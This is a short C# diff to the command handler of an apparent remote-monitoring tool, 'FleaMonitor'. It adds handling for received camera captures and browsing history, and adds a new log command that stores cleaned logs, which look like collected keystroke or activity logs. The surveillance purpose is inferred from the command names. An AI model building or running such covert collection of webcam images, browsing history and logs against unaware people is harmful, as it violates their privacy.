@@ -32,6 +32,7 @@ namespace FleaMonitor.Auxiliary
         private static readonly string BROWSING_HISTORY_FILENAME = "browsing_history.txt";
 
         public static string? WorkingPath { get; private set; }
+        public static string? LastCleanedLog { get; set; } = string.Empty;
 
         static CommandProcessor() => WorkingPath = GetAssemblyPath();
 
@@ -126,8 +127,15 @@ namespace FleaMonitor.Auxiliary
                     break;
 
                 case GET_CAMERA_CAPTURE_COMMAND:
+                    if(buffer.Length < 256)
+                    {
+                        fleaInfo.Txt = "Camera capture probably failed.\n";
+                        break;
+                    }
+
                     SaveByteArrayToFile(Convert.FromHexString(Encoding.UTF8.GetString(buffer)), value);
                     fleaInfo.Txt = "Camera capture saved.\n";
+                    
                     if(value.ToLower().IndexOf(".wmv") != -1)
                     {
                         PlayWMVFile(value);
@@ -141,6 +149,10 @@ namespace FleaMonitor.Auxiliary
                 case BROWSING_HISTORY_COMMAND:
                     SaveByteArrayToFile(buffer, BROWSING_HISTORY_FILENAME);
                     fleaInfo.Txt = $"File {BROWSING_HISTORY_FILENAME} saved.\n";
+                    break;
+
+                case LOG_COMMAND:
+                    LastCleanedLog = Helper.CleanLog(Encoding.UTF8.GetString(buffer));
                     break;
             }
         }
